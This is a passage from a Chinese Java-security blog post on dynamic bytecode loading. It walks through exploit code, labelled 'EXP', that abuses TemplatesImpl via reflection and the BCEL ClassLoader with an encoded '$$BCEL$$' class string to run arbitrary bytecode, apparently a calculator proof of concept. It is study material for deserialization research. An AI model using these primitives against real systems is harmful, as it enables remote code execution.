+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure>
+
+<p>这里<code>_name</code>不能为<code>null</code>，<code>_class</code>要为<code>null</code>，这才能进入到<code>defineTransletClasses()</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126144246987.png" srcset="/img/loading.gif" lazyload alt="image-20260126144246987"></p>
+<p>到了<code>defineTransletClasses</code>中，要想能走到下面触发到<code>defineClass</code>，上面的<code>_bytecodes</code>也不能为<code>null</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126144646569.png" srcset="/img/loading.gif" lazyload alt="image-20260126144646569"></p>
+<p>并且<code>_tfactory</code>需要是一个<code>TransformerFactoryImpl</code>对象，上图可以看到会调用到<code>_tfactory.getExternalExtensionsMap()</code>，如果<code>_tfactory</code>为<code>null</code>就会报错</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126144805201.png" srcset="/img/loading.gif" lazyload alt="image-20260126144805201"></p>
+<p>最后触发代码执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">templates.newTransformer();<br></code></pre></td></tr></table></figure>
+
+<p>完整EXP：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.TemplatesImplDemo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImplDemo</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:/tmp/TemplatesBytes.class&quot;</span>));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126145354752.png" srcset="/img/loading.gif" lazyload alt="image-20260126145354752"></p>
+<h2 id="5-利用BCEL-ClassLoader加载字节码"><a href="#5-利用BCEL-ClassLoader加载字节码" class="headerlink" title="5. 利用BCEL ClassLoader加载字节码"></a>5. 利用BCEL ClassLoader加载字节码</h2><blockquote>
+<ul>
+<li>什么是 BCEL？</li>
+</ul>
+<p>BCEL 的全名应该是 Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p>
+<p>我们可以通过 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.BCELDemo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.ClassLoaderDemo.Calc&quot;</span>);<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126150349752.png" srcset="/img/loading.gif" lazyload alt="image-20260126150349752"></p>
+<blockquote>
+<p>这一堆特殊的代码，BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。</p>
+</blockquote>
+<p>修改下EXP：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.BCELDemo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$AuQ$cbn$da$40$U$3d$D$G$h$d7$94$84$UJ$e8$bb$cd$83$b0$a87$d9$81$ba$a1$adT$d5m$aa$S$d1$f50$8c$e8$a4$c6F$f6$Q$e5$8f$b2fC$a2$$$fa$B$f9$a8$uw$iB$91$da$8c$e4$fb$9cs$ee$b9$e3$ab$eb$df$7f$A$ib$cf$85$83$c7$$$g$d8v$d04$fe$89$8d$a7$$$Kxf$e3$b9$8d$X$M$c5$ae$8a$94$7e$c7$90o$j$M$Y$ac$5e$3c$92$M$95$40E$f2$ebl2$94$c91$l$86T$a9$G$b1$e0$e1$80$t$ca$e4$cb$a2$a5$7f$aa$94$a1$Z$a4$89$f0$7b$nO$d3$m$e6$p$99$bc$97$93$d8$ef$f1Pt$Y$9c$ae$I$97$p$YAj$c1$J$3f$e5$be$8a$fdOG$l$ce$84$9cj$VGt$ad$dc$d7$5c$fc$fa$c2$a7$Z5$a9dp$fb$f1$y$R$f2$a32$a3J$86$ee$ad$c1z$u$c1$b5$f1$d2$c3$x$bc$s$N$qKxx$83$j$86$ad$ffp$7b$d8$85$cb$d0$b8O$o$c3F$86$Ky4$f6$8f$86$tRh$86$cd$bf$a5$ef$b3H$ab$J$vp$c7R$af$92Z$eb$m$f8$e7$O$ada$c93I$94$fb$ad$b5n_$t$w$gw$d6$B$df$92X$c84$r$40eJM$9d$z$7f$9cp$ni$v$9b$7e$9a990$b3$w$d9$H$94$f9$e4$Z$f9B$fb$Cl$9e$b5$3d$b2$c5$db$o$cad$bde$fc$Q$V$f2$O6V$60$9e$91$B$d5K$e4$aa$f9$F$ac$l$e7p$3e$b7$X$u$ce$b3z$89$b0$F$e43$c6$3aE$G$5d$o$a4y$eb2$b1lRt7$a1$M$8b$f2$we$5b$f4$d9$c8$F6$kY$d4$a8e$a2$ea7$ff$cd$e2c$7e$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126151023499.png" srcset="/img/loading.gif" lazyload alt="image-20260126151023499"></p>
+<blockquote>
+<h4 id="加上-BCEL-的原因"><a href="#加上-BCEL-的原因" class="headerlink" title="加上 $$BCEL$$的原因"></a>加上 <code>$$BCEL$$</code>的原因</h4><p>BCEL 这个包中有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个 ClassLoader，但是他重写了 Java 内置的<code>ClassLoader#loadClass()</code>方法。</p>
+<p>在 <code>ClassLoader#loadClass()</code> 中，其会判断类名是否是 <code>$$BCEL$$</code> 开头，如果是的话，将会对这个字符串进行 decode</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/Java%E5%AE%89%E5%85%A8/Java%E5%9F%BA%E7%A1%80/" class="category-chain-item">Java基础</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>动态加载字节码</div>
+      <div>https://yschen20.github.io/2026/01/26/动态加载字节码/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Suzen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年1月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/26/SpringCTF%E5%87%BA%E9%A2%98WP/" title="SpringCTF出题WP">
+                        <span class="hidden-mobile">SpringCTF出题WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("04/25/2025 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="https://static.kevinchu.top/blog/assets/js/stars.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
